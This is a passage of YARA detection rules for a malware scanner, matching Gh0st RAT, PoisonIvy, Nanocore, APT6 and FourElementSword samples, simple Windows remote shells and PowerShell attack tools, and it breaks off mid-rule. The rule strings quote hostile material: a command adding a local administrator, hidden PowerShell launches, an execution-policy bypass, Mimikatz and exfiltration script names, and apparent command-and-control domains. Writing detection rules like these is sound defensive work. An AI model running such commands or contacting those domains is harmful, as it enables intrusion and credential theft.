FILE MAL {\n   meta:\n      description = \"Detects Gh0st RAT mentioned in Cylance' Ghost Dragon Report\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.cylance.com/the-ghost-dragon\"\n      date = \"2016-04-23 13:22:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"71a52058f6b5cef66302c19169f67cf304507b4454cca83e2c36151da8da1d97\"\n      tags = \"CHINA, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"AdobeWpk\" fullword ascii\n      $x2 = \"seekin.dll\" fullword ascii\n      $c1 = \"Windows NT 6.1; Trident/6.0)\" fullword ascii\n      $c2 = \"Mozilla/5.0 (compatible; MSIE 10.0; \" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and ( all of ( $x* ) or all of ( $c* ) ) ) or ( all of them )\n}\n\nrule GhostDragon_Gh0stRAT_Sample3_RID3171 : CHINA DEMO MAL {\n   meta:\n      description = \"Detects Gh0st RAT mentioned in Cylance' Ghost Dragon Report\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.cylance.com/the-ghost-dragon\"\n      date = \"2016-04-23 13:22:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"1be9c68b31247357328596a388010c9cfffadcb6e9841fb22de8b0dc2d161c42\"\n      tags = \"CHINA, DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { 44 24 15 65 88 54 24 16 c6 44 24 } \n      $op2 = { 44 24 1b 43 c6 44 24 1c 75 88 54 24 1e } \n      $op3 = { 1e 79 c6 44 24 1f 43 c6 44 24 20 75 88 54 24 22 } \n   condition: \n      all of them\n}\n\nrule PoisonIvy_RAT_ssMUIDLL_RID2F13 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects PoisonIvy RAT DLL mentioned in Palo Alto Blog in April 2016\"\n      author = \"Florian Roth\"\n      reference = \"https://www.paloaltonetworks.com/blog/2016/04/unit42-new-poison-ivy-rat-variant-targets-hong-kong-pro-democracy-activists/\"\n      date = \"2016-04-22 11:41:41\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"7a424ad3f3106b87e8e82c7125834d7d8af8730a2a97485a639928f66d5f6bf4\"\n      hash2 = \"6eb7657603edb2b75ed01c004d88087abe24df9527b272605b8517a423557fe6\"\n      hash3 = \"2a6ef9dde178c4afe32fe676ff864162f104d85fac2439986de32366625dc083\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ssMUIDLL.dll\" fullword ascii\n      $op1 = { 6a 00 c6 07 e9 ff d6 } \n      $op2 = { 02 cb 6a 00 88 0f ff d6 47 ff 4d fc 75 } \n      $op3 = { 6a 00 88 7f 02 ff d6 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 20KB and ( all of ( $op* ) ) ) or ( all of them )\n}\n\nrule Nanocore_RAT_Gen_1_RID2D95 : APT DEMO EXE FILE GEN {\n   meta:\n      description = \"Detetcs the Nanocore RAT and similar malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.sentinelone.com/blogs/teaching-an-old-rat-new-tricks/\"\n      date = \"2016-04-22 10:38:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"e707a7745e346c5df59b5aa4df084574ae7c204f4fb7f924c0586ae03b79bf06\"\n      tags = \"APT, DEMO, EXE, FILE, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"C:\\\\Users\\\\Logintech\\\\Dropbox\\\\Projects\\\\New folder\\\\Latest\\\\Benchmark\\\\Benchmark\\\\obj\\\\Release\\\\Benchmark.pdb\" fullword ascii\n      $x2 = \"RunPE1\" fullword ascii\n      $x3 = \"082B8C7D3F9105DC66A7E3267C9750CF43E9D325\" fullword ascii\n      $x4 = \"$374e0775-e893-4e72-806c-a8d880a49ae7\" fullword ascii\n      $x5 = \"Monitorinjection\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( 1 of them ) ) or ( 3 of them )\n}\n\nrule Nanocore_RAT_Sample_1_RID2EDD : APT DEMO EXE FILE {\n   meta:\n      description = \"Detetcs a certain Nanocore RAT sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www.sentinelone.com/blogs/teaching-an-old-rat-new-tricks/\"\n      date = \"2016-04-22 11:32:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash2 = \"b7cfc7e9551b15319c068aae966f8a9ff563b522ed9b1b42d19c122778e018c8\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"TbSiaEdJTf9m1uTnpjS.n9n9M7dZ7FH9JsBARgK\" fullword wide\n      $x2 = \"1EF0D55861681D4D208EC3070B720C21D885CB35\" fullword ascii\n      $x3 = \"popthatkitty.Resources.resources\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 900KB and ( 1 of ( $x* ) ) ) or ( all of them )\n}\n\nrule Nanocore_RAT_Sample_2_RID2EDE : APT DEMO EXE FILE {\n   meta:\n      description = \"Detetcs a certain Nanocore RAT sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www.sentinelone.com/blogs/teaching-an-old-rat-new-tricks/\"\n      date = \"2016-04-22 11:32:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"51142d1fb6c080b3b754a92e8f5826295f5da316ec72b480967cbd68432cede1\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"U4tSOtmpM\" fullword ascii\n      $s2 = \")U71UDAU_QU_YU_aU_iU_qU_yU_\" wide\n      $s3 = \"Cy4tOtTmpMtTHVFOrR\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 40KB and all of ( $s* )\n}\n\nrule Metasploit_Loader_RSMudge_RID30DF : DEMO EXE FILE METASPLOIT SUSP {\n   meta:\n      description = \"Detects a Metasploit Loader by RSMudge - file loader.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/rsmudge/metasploit-loader\"\n      date = \"2016-04-20 12:58:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"afe34bfe2215b048915b1d55324f1679d598a0741123bc24274d4edc6e395a8d\"\n      tags = \"DEMO, EXE, FILE, METASPLOIT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Could not resolve target\" fullword ascii\n      $s2 = \"Could not connect to target\" fullword ascii\n      $s3 = \"%s [host] [port]\" fullword ascii\n      $s4 = \"ws2_32.dll is out of date.\" fullword ascii\n      $s5 = \"read a strange or incomplete length value\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( 3 of ( $s* ) ) ) or ( all of them )\n}\n\nrule APT6_Malware_Sample_Gen_RID2F8E : DEMO EXE FILE GEN MAL {\n   meta:\n      description = \"Rule written for 2 malware samples that communicated to APT6 C2 servers\"\n      author = \"Florian Roth\"\n      reference = \"https://otx.alienvault.com/pulse/56c4d1664637f26ad04e5b73/\"\n      date = \"2016-04-09 12:02:11\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      hash1 = \"321ec239bfa6927d39155ef5f10741ed786219489bbbb1dc8fee66e22f9f8e80\"\n      hash2 = \"7aef130b19d1f940e4c4cee6efe0f190f1402d2e0f741ee605c77518a04cb6d7\"\n      tags = \"DEMO, EXE, FILE, GEN, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x2 = \"SPCK!it is a [(?riddle?) wrapped in a {mystery}] inside an <enigma>!\" fullword ascii\n      $x3 = \"636C7369643A46334430443336462D323346382D343638322D413139352D373443393242303344344146\" fullword ascii\n      $s1 = \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\" fullword ascii\n      $s2 = \"DUMPTHIN\" fullword ascii\n      $s3 = \"\\\"C:\\\\WINDOWS\\\\system32\\\\\" ascii\n      $s4 = \"window.eval(f.decodeURIComponent(a));\" fullword ascii\n      $s5 = \"/tbedrs.dll\" fullword ascii\n      $s6 = \"NSISDL/1.2 (Mozilla)\" fullword ascii\n      $s7 = \"NSIS_Inetc (Mozilla)\" fullword ascii\n      $s8 = \"/logos.gif\" fullword ascii\n      $s9 = \"synflood\" fullword ascii\n      $s10 = \"IconFile=C:\\\\WINDOWS\\\\system32\\\\SHELL32.dll\" fullword ascii\n      $s11 = \"udpflood\" fullword ascii\n      $s12 = \"shellcode\" fullword ascii\n      $s13 = \"&PassWord=\" fullword ascii\n      $s14 = \"SystemPropertiesProtection.exe\" fullword ascii\n      $s15 = \"SystemPropertiesRemote.exe\" fullword ascii\n      $c1 = \"jobcall.org\" ascii\n      $c2 = \"sportsinfinite.com\" ascii\n      $c3 = \"milsatcom.us\" ascii\n      $c4 = \"geographicphotographer.com\" ascii\n      $c5 = \"snowsmooth.com\" ascii\n      $c6 = \"goodre.net\" ascii\n      $c7 = \"gloflabs.com\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( ( 1 of ( $x* ) and 3 of ( $s* ) ) or 1 of ( $c* ) ) ) or ( 6 of them )\n}\n\nrule Linux_Portscan_Shark_1_RID2FB2 : DEMO FILE HKTL LINUX T1046 {\n   meta:\n      description = \"Detects Linux Port Scanner Shark\"\n      author = \"Florian Roth\"\n      reference = \"Virustotal Research - see https://github.com/Neo23x0/Loki/issues/35\"\n      date = \"2016-04-01 12:08:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4da0e535c36c0c52eaa66a5df6e070c52e7ddba13816efc3da5691ea2ec06c18\"\n      hash2 = \"e395ca5f932419a4e6c598cae46f17b56eb7541929cdfb67ef347d9ec814dea3\"\n      tags = \"DEMO, FILE, HKTL, LINUX, T1046\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"rm -rf scan.log session.txt\" fullword ascii\n      $s17 = \"*** buffer overflow detected ***: %s terminated\" fullword ascii\n      $s18 = \"*** stack smashing detected ***: %s terminated\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7362 and all of them )\n}\n\nrule Linux_Portscan_Shark_2_RID2FB3 : DEMO HKTL LINUX T1046 {\n   meta:\n      description = \"Detects Linux Port Scanner Shark\"\n      author = \"Florian Roth\"\n      reference = \"Virustotal Research - see https://github.com/Neo23x0/Loki/issues/35\"\n      date = \"2016-04-01 12:08:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"5f80bd2db608a47e26290f3385eeb5bfc939d63ba643f06c4156704614def986\"\n      hash2 = \"90af44cbb1c8a637feda1889d301d82fff7a93b0c1a09534909458a64d8d8558\"\n      tags = \"DEMO, HKTL, LINUX, T1046\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"usage: %s <fisier ipuri> <fisier useri:parole> <connect timeout> <fail2ban wait> <threads> <outfile> <port>\" fullword ascii\n      $s2 = \"Difference between server modulus and host modulus is only %d. It's illegal and may not work\" fullword ascii\n      $s3 = \"rm -rf scan.log\" fullword ascii\n   condition: \n      all of them\n}\n\nrule TempRacer_RID2A94 : DEMO EXE FILE HKTL T1068 T1087_001 {\n   meta:\n      description = \"Detects privilege escalation tool - file TempRacer_RID2A94.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://www.darknet.org.uk/2016/03/tempracer-windows-privilege-escalation-tool/\"\n      date = \"2016-03-30 06:58:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE, HKTL, T1068, T1087_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\obj\\\\Release\\\\TempRacer_RID2A94.pdb\" ascii\n      $s2 = \"[+] Injecting into \" fullword wide\n      $s3 = \"net localgroup administrators alex /add\" fullword wide\n      $s4 = \"[+] File: {0} renamed to {1}\" fullword wide\n      $s5 = \"[+] Blocking \" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 25KB and 1 of them ) or ( 4 of them )\n}\n\nrule FourElementSword_Config_File_RID321A : DEMO MAL {\n   meta:\n      description = \"Detects FourElementSword Malware\"\n      author = \"Florian Roth\"\n      reference = \"not set\"\n      date = \"2016-03-26 13:50:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"01,,hccutils.dll,2\" fullword ascii\n      $s1 = \"RegisterDlls=OurDll\" fullword ascii\n      $s2 = \"[OurDll]\" fullword ascii\n      $s3 = \"[DefaultInstall]\" fullword ascii\n      $s4 = \"Signature=\\\"$Windows NT$\\\"\" fullword ascii\n   condition: \n      4 of them\n}\n\nrule FourElementSword_32DLL_RID2F26 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects FourElementSword Malware\"\n      author = \"Florian Roth\"\n      reference = \"not set\"\n      date = \"2016-03-26 11:44:51\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%temp%\\\\tmp092.tmp\" fullword ascii\n      $s2 = \"%SystemRoot%\\\\System32\\\\\" ascii\n      $s1 = \"\\\\System32\\\\ctfmon.exe\" ascii\n      $s3 = \"32.dll\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 660KB and $x1 ) or ( all of them )\n}\n\nrule FourElementSword_ElevateDLL_2_RID3218 : DEMO EXE FILE MAL T1082 {\n   meta:\n      description = \"Detects FourElementSword Malware\"\n      author = \"Florian Roth\"\n      reference = \"not set\"\n      date = \"2016-03-26 13:50:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE, MAL, T1082\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Elevate.dll\" fullword ascii\n      $s2 = \"GetSomeF\" fullword ascii\n      $s3 = \"GetNativeSystemInfo\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 25KB and $s1 ) or ( all of them )\n}\n\nrule FourElementSword_fslapi_dll_gui_RID33A3 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects FourElementSword Malware\"\n      author = \"Florian Roth\"\n      reference = \"not set\"\n      date = \"2016-03-26 14:56:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"fslapi.dll.gui\" fullword wide\n      $s2 = \"ImmGetDefaultIMEWnd\" fullword ascii\n      $s3 = \"RichOX\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 12KB and all of them )\n}\n\nrule FourElementSword_PowerShell_Start_RID3457 : DEMO MAL SCRIPT T1059_001 {\n   meta:\n      description = \"Detects FourElementSword Malware\"\n      author = \"Florian Roth\"\n      reference = \"not set\"\n      date = \"2016-03-26 15:26:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, MAL, SCRIPT, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"start /min powershell C:\\\\\\\\ProgramData\\\\\\\\wget.exe\" ascii\n      $s1 = \"start /min powershell C:\\\\\\\\ProgramData\\\\\\\\iuso.exe\" fullword ascii\n   condition: \n      1 of them\n}\n\nrule FourElementSword_ResN32DLL_RID309E : DEMO MAL {\n   meta:\n      description = \"Detects FourElementSword Malware\"\n      author = \"Florian Roth\"\n      reference = \"not set\"\n      date = \"2016-03-26 12:47:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\Release\\\\BypassUAC.pdb\" ascii\n      $s2 = \"\\\\ResN32.dll\" wide\n      $s3 = \"Eupdate\" fullword wide\n   condition: \n      all of them\n}\n\nrule ProjectM_CrimsonDownloader_RID317E : DEMO EXE FILE G0134 MAL {\n   meta:\n      description = \"Detects ProjectM Malware\"\n      author = \"Florian Roth\"\n      reference = \"http://researchcenter.paloaltonetworks.com/2016/03/unit42-projectm-link-found-between-pakistani-actor-and-operation-transparent-tribe/\"\n      date = \"2016-03-26 13:24:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE, G0134, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"E:\\\\Projects\\\\m_project\\\\main\\\\mj shoaib\" \n      $s1 = \"\\\\obj\\\\x86\\\\Debug\\\\secure_scan.pdb\" ascii\n      $s2 = \"secure_scan.exe\" fullword wide\n      $s3 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run|mswall\" fullword wide\n      $s4 = \"secure_scan|mswall\" fullword wide\n      $s5 = \"[Microsoft-Security-Essentials]\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and $x1 ) or ( all of them )\n}\n\nrule FourElementSword_T9000_RID2F02 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects FourElementSword Malware\"\n      author = \"Florian Roth\"\n      reference = \"not set\"\n      date = \"2016-03-26 11:38:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"D:\\\\WORK\\\\T9000\\\\\" ascii\n      $x2 = \"%s\\\\temp\\\\HHHH.dat\" fullword wide\n      $s1 = \"Elevate.dll\" fullword wide\n      $s2 = \"ResN32.dll\" fullword wide\n      $s3 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\" fullword wide\n      $s4 = \"igfxtray.exe\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 1 of ( $x* ) ) or ( all of them )\n}\n\nrule FourElementSword_Keyainst_EXE_RID326E : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects FourElementSword Malware\"\n      author = \"Florian Roth\"\n      reference = \"not set\"\n      date = \"2016-03-26 14:04:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"C:\\\\ProgramData\\\\Keyainst.exe\" fullword ascii\n      $s1 = \"ShellExecuteA\" fullword ascii\n      $s2 = \"GetStartupInfoA\" fullword ascii\n      $s3 = \"SHELL32.dll\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 48KB and $x1 ) or ( all of them )\n}\n\nrule FourElementSword_ElevateDLL_RID3187 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects FourElementSword Malware\"\n      author = \"Florian Roth\"\n      reference = \"not set\"\n      date = \"2016-03-26 13:26:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3dfc94605daf51ebd7bbccbb3a9049999f8d555db0999a6a7e6265a7e458cab9\"\n      hash2 = \"5f3d0a319ecc875cc64a40a34d2283cb329abcf79ad02f487fbfd6bef153943c\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Elevate.dll\" fullword wide\n      $x2 = \"ResN32.dll\" fullword wide\n      $s1 = \"Kingsoft\\\\Antivirus\" fullword wide\n      $s2 = \"KasperskyLab\\\\protected\" fullword wide\n      $s3 = \"Sophos\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 1 of ( $x* ) and all of ( $s* ) ) or ( all of them )\n}\n\nrule WindowsShell_s3_RID2CF9 : DEMO EXE FILE MAL SCRIPT {\n   meta:\n      description = \"Detects simple Windows shell - file s3.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/odzhan/shells/\"\n      date = \"2016-03-26 10:12:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE, MAL, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"cmd                  - execute cmd.exe\" fullword ascii\n      $s2 = \"\\\\\\\\.\\\\pipe\\\\%08X\" fullword ascii\n      $s3 = \"get <remote> <local> - download file\" fullword ascii\n      $s4 = \"[ simple remote shell for windows v3\" fullword ascii\n      $s5 = \"REMOTE: CreateFile(\\\"%s\\\")\" fullword ascii\n      $s6 = \"put <local> <remote> - upload file\" fullword ascii\n      $s7 = \"term                 - terminate remote client\" fullword ascii\n      $s8 = \"[ downloading \\\"%s\\\" to \\\"%s\\\"\" fullword ascii\n      $s9 = \"-l           Listen for incoming connections\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 150KB and 2 of them ) or ( 5 of them )\n}\n\nrule WindosShell_s1_RID2C80 : DEMO EXE FILE MAL SCRIPT {\n   meta:\n      description = \"Detects simple Windows shell - file s1.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/odzhan/shells/\"\n      date = \"2016-03-26 09:51:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE, MAL, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[ executing cmd.exe\" fullword ascii\n      $s2 = \"[ simple remote shell for windows v1\" fullword ascii\n      $s3 = \"-p <number>  Port number to use (default is 443)\" fullword ascii\n      $s4 = \"usage: s1 <address> [options]\" fullword ascii\n      $s5 = \"[ waiting for connections on %s\" fullword ascii\n      $s6 = \"-l           Listen for incoming connections\" fullword ascii\n      $s7 = \"[ connection from %s\" fullword ascii\n      $s8 = \"[ %c%c requires parameter\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 150KB and 2 of them ) or ( 5 of them )\n}\n\nrule WindowsShell_s4_RID2CFA : DEMO EXE FILE MAL SCRIPT {\n   meta:\n      description = \"Detects simple Windows shell - file s4.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/odzhan/shells/\"\n      date = \"2016-03-26 10:12:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE, MAL, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"cmd                  - execute cmd.exe\" fullword ascii\n      $s2 = \"\\\\\\\\.\\\\pipe\\\\%08X\" fullword ascii\n      $s3 = \"get <remote> <local> - download file\" fullword ascii\n      $s4 = \"[ simple remote shell for windows v4\" fullword ascii\n      $s5 = \"REMOTE: CreateFile(\\\"%s\\\")\" fullword ascii\n      $s6 = \"[ downloading \\\"%s\\\" to \\\"%s\\\"\" fullword ascii\n      $s7 = \"[ uploading \\\"%s\\\" to \\\"%s\\\"\" fullword ascii\n      $s8 = \"-l           Listen for incoming connections\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 175KB and 2 of them ) or ( 5 of them )\n}\n\nrule WindowsShell_Gen_RID2D6D : DEMO EXE FILE GEN MAL SCRIPT {\n   meta:\n      description = \"Detects simple Windows shell - from files keygen.exe, s1.exe, s2.exe, s3.exe, s4.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/odzhan/shells/\"\n      date = \"2016-03-26 10:31:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a7c3d85eabac01e7a7ec914477ea9f17e3020b3b2f8584a46a98eb6a2a7611c5\"\n      hash2 = \"4a397497cfaf91e05a9b9d6fa6e335243cca3f175d5d81296b96c13c624818bd\"\n      hash3 = \"df0693caae2e5914e63e9ee1a14c1e9506f13060faed67db5797c9e61f3907f0\"\n      tags = \"DEMO, EXE, FILE, GEN, MAL, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"[ %c%c requires parameter\" fullword ascii\n      $s1 = \"[ %s : %i\" fullword ascii\n      $s2 = \"[ %s : %s\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 175KB and 2 of them ) or ( all of them )\n}\n\nrule WindowsShell_Gen2_RID2D9F : DEMO EXE FILE MAL SCRIPT {\n   meta:\n      description = \"Detects simple Windows shell - from files s3.exe, s4.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/odzhan/shells/\"\n      date = \"2016-03-26 10:39:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"344575a58db288c9b5dacc654abc36d38db2e645acff05e894ff51183c61357d\"\n      hash2 = \"f00a1af494067b275407c449b11dfcf5cb9b59a6fac685ebd3f0eb193337e1d6\"\n      tags = \"DEMO, EXE, FILE, MAL, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"cmd                  - execute cmd.exe\" fullword ascii\n      $s2 = \"get <remote> <local> - download file\" fullword ascii\n      $s3 = \"REMOTE: CreateFile(\\\"%s\\\")\" fullword ascii\n      $s4 = \"put <local> <remote> - upload file\" fullword ascii\n      $s5 = \"term                 - terminate remote client\" fullword ascii\n      $s6 = \"[ uploading \\\"%s\\\" to \\\"%s\\\"\" fullword ascii\n      $s7 = \"[ error : received %i bytes\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 175KB and 2 of them ) or ( 5 of them )\n}\n\nrule Powershell_Attack_Scripts_RID3134 : DEMO HKTL SCRIPT T1059_001 {\n   meta:\n      description = \"Powershell Attack Scripts\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2016-03-09 13:12:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, SCRIPT, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"PowershellMafia\\\\Invoke-Shellcode.ps1\" ascii\n      $s2 = \"Nishang\\\\Do-Exfiltration.ps1\" ascii\n      $s3 = \"PowershellMafia\\\\Invoke-Mimikatz.ps1\" ascii\n      $s4 = \"Inveigh\\\\Inveigh.ps1\" ascii\n   condition: \n      1 of them\n}\n\nrule PSAttack_ZIP_RID2B5E : DEMO FILE HKTL SCRIPT T1059_001 {\n   meta:\n      description = \"PSAttack - Powershell attack tool - file PSAttack.zip\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/gdssecurity/PSAttack/releases/\"\n      date = \"2016-03-09 09:03:31\"\n      score = 100\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, FILE, HKTL, SCRIPT, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"PSAttack.exe\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x4b50 and all of them\n}\n\nrule PSAttack_EXE_RID2B4D : DEMO EXE HKTL SCRIPT T1059_001 {\n   meta:\n      description = \"PSAttack - Powershell attack tool - file PSAttack.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/gdssecurity/PSAttack/releases/\"\n      date = \"2016-03-09 09:00:41\"\n      score = 100\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, HKTL, SCRIPT, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\Release\\\\PSAttack.pdb\" \n      $s1 = \"set-executionpolicy bypass -Scope process -Force\" fullword wide\n      $s2 = \"PSAttack.Modules.\" ascii\n      $s3 = \"PSAttack.PSAttackProcessing\" fullword ascii\n      $s4 = \"PSAttack.Modules.key.txt\" fullword wide\n   condition: \n      